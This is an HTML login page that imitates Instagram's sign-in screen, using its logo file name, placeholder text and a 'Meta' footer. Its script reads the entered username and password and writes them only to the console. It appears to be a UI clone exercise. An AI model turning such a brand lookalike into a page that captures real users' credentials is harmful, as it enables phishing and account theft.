<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login Page</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #000;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
    }
    .login-container {
      width: 90%;
      max-width: 400px;
      background:transparent;
      padding: 20px;
      border-radius: 10px;
      text-align: center;
    }
    .logo {

      margin-bottom: 20px;
      background: transparent;

    }
    .logo img {
      width: 78px;
      border-radius: 20%;
      border: 3px solid #ffffff;
      
      box-shadow: 0 4px 8px rgba(red, green, blue, alpha);

      
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      background: #333;
      border: none;
      border-radius: 5px;
      color: white;
    }
    input::placeholder {
      color: #aaa;
    }
    .btn {
      width: 100%;
      padding: 10px;
      background: #1e90ff;
      border: none;
      border-radius: 5px;
      color: white;
      font-weight: bold;
      cursor: pointer;
    }
    .btn:hover {
      background: #1c86ee;
    }
    .forgot-password,
    .create-account {
      margin-top: 15px;
      color: #1e90ff;
      text-decoration: none;
      font-size: 14px;
    }
    .meta {
      margin-top: 20px;
      color: #666;
      font-size: 12px;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <!-- Logo -->
    <div class="logo">
      <img src="instagram.jpeg" alt="Instagram Logo">
    </div>

    <!-- Login Form -->
    <form id="loginForm">
      <input
        type="text"
        id="username"
        placeholder="Username, email address or mobile number"
        required
      />
      <input
        type="password"
        id="password"
        placeholder="Password"
        required
      />
      <button type="submit" class="btn">Log in</button>
    </form>

    <!-- Forgot Password -->
    <a href="#" class="forgot-password">Forgotten Password?</a>

    <!-- Create Account -->
    <a href="#" class="create-account">Create new account</a>

    <!-- Meta Logo -->
    <div class="meta">Meta</div>
  </div>

  <script>
    // Form submission handler
    const loginForm = document.getElementById('loginForm');
    loginForm.addEventListener('submit', (e) => {
      e.preventDefault(); // Prevent page reload

      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;

      console.log(`Username: ${username}`);
      console.log(`Password: ${password}`);
    });
  </script>
</body>
</html>
